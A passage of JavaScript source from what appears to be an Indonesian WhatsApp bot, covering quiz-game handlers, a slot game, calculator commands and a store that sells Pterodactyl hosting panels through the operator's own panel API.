await Line.sendMessage(m.chat, {image: {url: result.img }, caption: `Apa nama Game diatas?\n\nWaktu: ${(120000 / 1000).toFixed(2)} detik\n\nKetik .nyerah untuk menyerah` }, { quoted: m }), result, 250,
setTimeout(() => {
if (tebakgame[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete tebakgame[m.chat]
}}, 120000)
]}
break

case 'slot': {
if (!m.isGroup) return onlyGrup()
try {
let _spin1 = pickRandom(['1', '2', '3', '4', '5']) 
let _spin2 = pickRandom(['1', '2', '3', '4', '5'])
let _spin3 = pickRandom(['1', '2', '3', '4', '5'])
let _spin4 = pickRandom(['1', '2', '3', '4', '5'])
let _spin5 = pickRandom(['1', '2', '3', '4', '5'])
let _spin6 = pickRandom(['1', '2', '3', '4', '5'])
let _spin7 = pickRandom(['1', '2', '3', '4', '5'])
let _spin8 = pickRandom(['1', '2', '3', '4', '5'])
let _spin9 = pickRandom(['1', '2', '3', '4', '5'])
let spin1 = (_spin1 * 1)
let spin2 = (_spin2 * 1)
let spin3 = (_spin3 * 1)
let spin4 = (_spin4 * 1)
let spin5 = (_spin5 * 1)
let spin6 = (_spin6 * 1)
let spin7 = (_spin7 * 1)
let spin8 = (_spin8 * 1)
let spin9 = (_spin9 * 1)
let spins1 = (spin1 == 1 ? '🍊' : spin1 == 2 ? '🍇' : spin1 == 3 ? '🍉' : spin1 == 4 ? '🍌' : spin1 == 5 ? '🍍' : '')
let spins2 = (spin2 == 1 ? '🍊' : spin2 == 2 ? '🍇' : spin2 == 3 ? '🍉' : spin2 == 4 ? '🍌' : spin2 == 5 ? '🍍' : '')
let spins3 = (spin3 == 1 ? '🍊' : spin3 == 2 ? '🍇' : spin3 == 3 ? '🍉' : spin3 == 4 ? '🍌' : spin3 == 5 ? '🍍' : '')
let spins4 = (spin4 == 1 ? '🍊' : spin4 == 2 ? '🍇' : spin4 == 3 ? '🍉' : spin4 == 4 ? '🍌' : spin4 == 5 ? '🍍' : '')
let spins5 = (spin5 == 1 ? '🍊' : spin5 == 2 ? '🍇' : spin5 == 3 ? '🍉' : spin5 == 4 ? '🍌' : spin5 == 5 ? '🍍' : '')
let spins6 = (spin6 == 1 ? '🍊' : spin6 == 2 ? '🍇' : spin6 == 3 ? '🍉' : spin6 == 4 ? '🍌' : spin6 == 5 ? '🍍' : '')
let spins7 = (spin7 == 1 ? '🍊' : spin7 == 2 ? '🍇' : spin7 == 3 ? '🍉' : spin7 == 4 ? '🍌' : spin7 == 5 ? '🍍' : '')
let spins8 = (spin8 == 1 ? '🍊' : spin8 == 2 ? '🍇' : spin8 == 3 ? '🍉' : spin8 == 4 ? '🍌' : spin8 == 5 ? '🍍' : '')
let spins9 = (spin9 == 1 ? '🍊' : spin9 == 2 ? '🍇' : spin9 == 3 ? '🍉' : spin9 == 4 ? '🍌' : spin9 == 5 ? '🍍' : '' )
let WinOrLose
if (spin1 == 1 && spin2 == 1 && spin3 == 1 && spin4 == 1 && spin5 == 1 && spin6 == 1 && spin7 == 1 && spin8 == 1 && spin9 == 1 || spin1 == 2 && spin2 == 2 && spin3 == 2 && spin4 == 2 && spin5 == 2 && spin6 == 2 && spin7 == 2 && spin8 == 2 && spin9 == 2 || spin1 == 3 && spin2 == 3 && spin3 == 3 && spin4 == 3 && spin5 == 3 && spin6 == 3 && spin7 == 3 && spin8 == 3 && spin9 == 3 || spin1 == 4 && spin2 == 4 && spin3 == 4 && spin4 == 4 && spin5 == 4 && spin6 == 4 && spin7 == 4 && spin8 == 4 && spin9 == 4 || spin1 == 5 && spin2 == 5 && spin3 == 5 && spin4 == 5 && spin5 == 5 && spin6 == 5 && spin7 == 5 && spin8 == 5 && spin9 == 5) {
WinOrLose = "Kamu menang lagi dan mendapatkan 100 saldo!"
addSaldo(usere, 100)
} else if (spin4 == 1 && spin5 == 1 && spin6 == 1 || spin4 == 2 && spin5 == 2 && spin6 == 2 || spin4 == 3 && spin5 == 3 && spin6 == 3 || spin4 == 4 && spin5 == 4 && spin6 == 4 || spin4 == 5 && spin5 == 5 && spin6 == 5) {
WinOrLose = "Kamu menang dan mendapatkan 50 saldo!"
addSaldo(usere, 50) 
} else if (spin1 == 1 && spin2 == 1 && spin3 == 1 || spin1 == 2 && spin2 == 2 && spin3 == 2 || spin1 == 3 && spin2 == 4 && spin3 == 3 || spin1 == 4 && spin2 == 4 && spin3 == 4 || spin1 == 5 && spin2 == 5 && spin3 == 5 || spin1 == 6 && spin2 == 6 && spin3 == 6 || spin1 == 7 && spin2 == 7 && spin3 == 7 || spin1 == 8 && spin2 == 8 && spin3 == 8 || spin1 == 9 && spin2 == 9 && spin3 == 9) { 
WinOrLose = "Kamu menang dalam pertandingan ini!\n+ 10 saldo"
addSaldo(usere, 10)
} else {
WinOrLose = "Kamu kalah dalam pertandingan ini!"
}
ditt(`Memutar...`, `Memutar..`, `Memutar...`, `*—————— 「 GAME  SLOT 」 ——————*

${spins1} ${spins2} ${spins3}
${spins4} ${spins5} ${spins6}
${spins7} ${spins8} ${spins9}

${WinOrLose}`.trim(), )
} catch (err) {
m.reply('Terjadi kesalahan')
}}
break

case 'nyerah': {
if (m.chat in tebakgambar) {
let { soal, jawaban, hadiah, waktu } = tebakgambar[m.chat]
clearTimeout(waktu)
delete tebakgambar[m.chat]
return Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in tebakkalimat) {
let { soal, jawaban, hadiah, waktu } = tebakkalimat[m.chat]
clearTimeout(waktu)
delete tebakkalimat[m.chat]
return Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in tebakkata) {
let { soal, jawaban, hadiah, waktu } = tebakkata[m.chat]
clearTimeout(waktu)
delete tebakkata[m.chat]
return Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in tebaklirik) {
let { soal, jawaban, hadiah, waktu } = tebaklirik[m.chat]
clearTimeout(waktu)
delete tebaklirik[m.chat]
return Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in tebakanime) {
let { soal, jawaban, hadiah, waktu } = tebakanime[m.chat]
clearTimeout(waktu)
delete tebakanime[m.chat]
return Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in tebaklagu) {
let { soal, jawaban, hadiah, waktu } = tebaklagu[m.chat]
clearTimeout(waktu)
delete tebaklagu[m.chat]
return Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in kuis) {
let { soal, jawaban, hadiah, waktu } = kuis[m.chat]
clearTimeout(waktu)
delete kuis[m.chat]
return Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in tebakkimia) {
let { soal, jawaban, hadiah, waktu } = tebakkimia[m.chat]
clearTimeout(waktu)
delete tebakkimia[m.chat]
return Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in tebakbendera) {
let { soal, jawaban, hadiah, waktu } = tebakbendera[m.chat]
clearTimeout(waktu)
delete tebakbendera[m.chat]
return Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in siapakahaku) {
let { soal, jawaban, hadiah, waktu } = siapakahaku[m.chat]
clearTimeout(waktu)
delete siapakahaku[m.chat]
return Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in asahotak) {
let { soal, jawaban, hadiah, waktu } = asahotak[m.chat]
clearTimeout(waktu)
delete asahotak[m.chat]
return Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in susunkata) {
let { soal, jawaban, hadiah, waktu } = susunkata[m.chat]
clearTimeout(waktu)
delete susunkata[m.chat]
return Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in caklontong) {
let { soal, jawaban, hadiah, waktu } = caklontong[m.chat]
clearTimeout(waktu)
delete caklontong[m.chat]
return Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in kuismath) {
let { soal, jawaban, hadiah, waktu } = kuismath[m.chat]
clearTimeout(waktu)
delete kuismath[m.chat]
return Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
}
if (m.chat in tebakgame) {
clearTimeout(tebakgame[m.chat][3])
delete tebakgame[m.chat]
return Line.sendMessage(m.chat, {text: `Yahh, masa nyerah :)`}, {quoted: m})
}}
break

// === Store Menu

case 'tambah': {
if (!text.includes('+')) return m.reply(`Contoh: ${prefix+command} angka+angka+...`);
const arg = args.join(' ');
const angkaArray = arg.split('+').map(Number);
const hasil = angkaArray.reduce((acc, num) => acc + num, 0);
if (isNaN(hasil)) {
m.reply('Angka tidak valid. Pastikan untuk memasukkan angka yang benar.');
} else {
m.reply(`Hasil: ${toRupiah(hasil)}`);
}}
break

case 'kurang': {
if (!text.includes('-')) return m.reply(`Contoh: ${prefix+command} angka-angka-...`);
const arg = args.join(' ');
const angkaArray = arg.split('-').map(Number);
const hasil = angkaArray.reduce((acc, num) => acc - num);
if (isNaN(hasil)) {
m.reply('Angka tidak valid. Pastikan untuk memasukkan angka yang benar.');
} else {
m.reply(`Hasil: ${toRupiah(hasil)}`);
}}
break

case 'kali': {
if (!text.includes('*')) return m.reply(`Contoh: ${prefix+command} angka*angka*...`);
const arg = args.join(' ');
const angkaArray = arg.split('*').map(Number);
const hasil = angkaArray.reduce((acc, num) => acc * num, 1);
if (isNaN(hasil)) {
m.reply('Angka tidak valid. Pastikan untuk memasukkan angka yang benar.');
} else {
m.reply(`Hasil: ${toRupiah(hasil)}`);
}}
break

case 'bagi': {
if (!text.includes('/')) return m.reply(`Contoh: ${prefix+command} angka/angka/...`);
const arg = args.join(' ');
const angkaArray = arg.split('/').map(Number);
const hasil = angkaArray.reduce((acc, num) => acc / num);
if (isNaN(hasil)) {
m.reply('Angka tidak valid. Pastikan untuk memasukkan angka yang benar.');
} else {
m.reply(`Hasil: ${toRupiah(hasil)}`);
}}
break

case 'buygold':
case 'topupg': {
if (!text) return m.reply(`Masukkan nominal gold yang ingin dibeli.\nContoh: ${prefix+command} 1`);
const hargaPerGold = 7000;
const nominal = parseInt(args[0]);
if (isNaN(nominal) || nominal <= 0) return m.reply('Minimal pembelian 1 gold')
const totalHarga = nominal * hargaPerGold;
const saldoSaatIni = cekSaldo(m.sender);
if (saldoSaatIni < totalHarga) {
return m.reply(`Info Harga ${nominal} Gold\nSaldo kamu: ${toRupiah(saldoSaatIni)}\nHarga total: Rp. ${toRupiah(totalHarga)}\n\nSaldo kamu tidak cukup.`);
}

addGold(m.sender, nominal);
minSaldo(m.sender, totalHarga);
const hargaPerGoldFormatted = toRupiah(hargaPerGold);
const totalHargaFormatted = toRupiah(totalHarga);
const saldoAkhirFormatted = toRupiah(cekSaldo(m.sender));
 
await m.reply(`🔔 Transaksi Berhasil! 🔔\n\n✨ Kamu berhasil membeli ${nominal} gold. ✨\n\nRincian Pembelian:\n${nominal} gold x Rp. ${hargaPerGoldFormatted} = Rp. ${totalHargaFormatted}\n\n💵 Saldo kamu sekarang: Rp. ${saldoAkhirFormatted}`)
}
break

case 'buysaldo':
case 'topups': {
if (!text) return m.reply(`Masukkan nominal saldo yang ingin dibeli.\nContoh: ${prefix+command} 1500`)
const hargaPer1500Saldo = 1000;
const nominal = parseInt(args[0]);
if (isNaN(nominal) || nominal < 1500) return m.reply('Minimal pembelian 1500 saldo')
const totalLimit = Math.ceil(nominal / 1500) * hargaPer1500Saldo;
const limitSaatIni = cekLimit(m.sender)
 
if (limitSaatIni < totalLimit) {
return m.reply(`Informasi Pembelian Saldo\n\nNominal saldo: ${nominal}\nHarga per 1500 saldo: ${toRupiah(hargaPer1500Saldo)} limit\nTotal limit yang dibutuhkan: ${toRupiah(totalLimit)} limit\n\nLimit kamu saat ini: ${toRupiah(limitSaatIni)}\n\nLimit kamu tidak cukup untuk melakukan pembelian.`);
}
 
addSaldo(m.sender, nominal)
minLimit(m.sender, totalLimit)
const hargaPer1500SaldoFormatted = toRupiah(hargaPer1500Saldo);
const totalLimitFormatted = toRupiah(totalLimit);
const limitAkhirFormatted = toRupiah(cekLimit(m.sender));
await m.reply(`🔔 Transaksi Berhasil! 🔔\n\n✨ Kamu berhasil membeli ${nominal} saldo. ✨\n\nRincian Pembelian:\n${nominal} saldo x Rp. ${hargaPer1500SaldoFormatted} (per 1500 saldo) = Rp. ${totalLimitFormatted} limit\n\n💵 Limit kamu sekarang: Rp. ${limitAkhirFormatted}`);
}
break

case 'buy1gb': {
if (cekSaldo(m.sender) < 6000) return m.reply(`Saldo kamu kurang\n\nSaldo kamu Rp. ${toRupiah(cekSaldo(m.sender))}\nHarga panel 1GB: Rp. 6.000`)
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "1050"
let cpu = "30"
let disk = "1050"
let email = username + "@gmail.com"

if (!u) return
let d = (await Line.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? randomKarakter(5) : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(`${global.domain}` + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(`${global.domain}` + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang membuat server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* 

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panel ini baik-baik`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Buy Using Saldo`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${global.domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await Line.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(`${global.domain}` + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*Sukses membeli panel 1GB*

ID User: ${user.id}
ID Server: ${server.id}

Sisanya dikirim lewat PC`)
await sleep(1000)
m.reply(`Sukses membayar seharga Rp. 6.000`)
minSaldo(m.sender, 6000)
}
break

case 'buy2gb': {
if (cekSaldo(m.sender) < 7000) return m.reply(`Saldo kamu kurang\n\nSaldo kamu Rp. ${toRupiah(cekSaldo(m.sender))}\nHarga panel 2GB: Rp. 7.000`)
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "2050"
let cpu = "60"
let disk = "2050"
let email = username + "@gmail.com"

if (!u) return
let d = (await Line.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? randomKarakter(5) : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(`${global.domain}` + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(`${global.domain}` + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang membuat server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* 

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panel ini baik-baik`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Buy Using Saldo`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${global.domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await Line.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(`${global.domain}` + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*Sukses membeli panel 2GB*

ID User: ${user.id}
ID Server: ${server.id}

Sisanya dikirim lewat PC`)
await sleep(1000)
m.reply(`Sukses membayar seharga Rp. 7.000`)
minSaldo(m.sender, 7000)
}
break

case 'buy3gb': {
if (cekSaldo(m.sender) < 8000) return m.reply(`Saldo kamu kurang\n\nSaldo kamu Rp. ${toRupiah(cekSaldo(m.sender))}\nHarga panel 3GB: Rp. 8.000`)
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "3050"
let cpu = "120"
let disk = "3050"
let email = username + "@gmail.com"

if (!u) return
let d = (await Line.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? randomKarakter(5) : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(`${global.domain}` + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(`${global.domain}` + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang membuat server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* 

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panel ini baik-baik`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Buy Using Saldo`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${global.domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await Line.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(`${global.domain}` + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*Sukses membeli panel 3GB*

ID User: ${user.id}
ID Server: ${server.id}

Sisanya dikirim lewat PC`)
await sleep(1000)
m.reply(`Sukses membayar seharga Rp. 8.000`)
minSaldo(m.sender, 8000)
}
break

case 'buy4gb': {
if (cekSaldo(m.sender) < 9000) return m.reply(`Saldo kamu kurang\n\nSaldo kamu Rp. ${toRupiah(cekSaldo(m.sender))}\nHarga panel 4GB: Rp. 9.000`)
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "4050"
let cpu = "120"
let disk = "4050"
let email = username + "@gmail.com"

if (!u) return
let d = (await Line.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? randomKarakter(5) : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(`${global.domain}` + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(`${global.domain}` + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang membuat server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* 

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panel ini baik-baik`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Buy Using Saldo`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${global.domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await Line.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(`${global.domain}` + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*Sukses membeli panel 4GB*

ID User: ${user.id}
ID Server: ${server.id}

Sisanya dikirim lewat PC`)
await sleep(1000)
m.reply(`Sukses membayar seharga Rp. 9.000`)
minSaldo(m.sender, 9000)
}
break

case 'buy5gb': {
if (cekSaldo(m.sender) < 10000) return m.reply(`Saldo kamu kurang\n\nSaldo kamu Rp. ${toRupiah(cekSaldo(m.sender))}\nHarga panel 5GB: Rp. 10.000`)
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "5050"
let cpu = "120"
let disk = "5050"
let email = username + "@gmail.com"

if (!u) return
let d = (await Line.onWhatsApp(u.split`@`[0]))[0] || {}
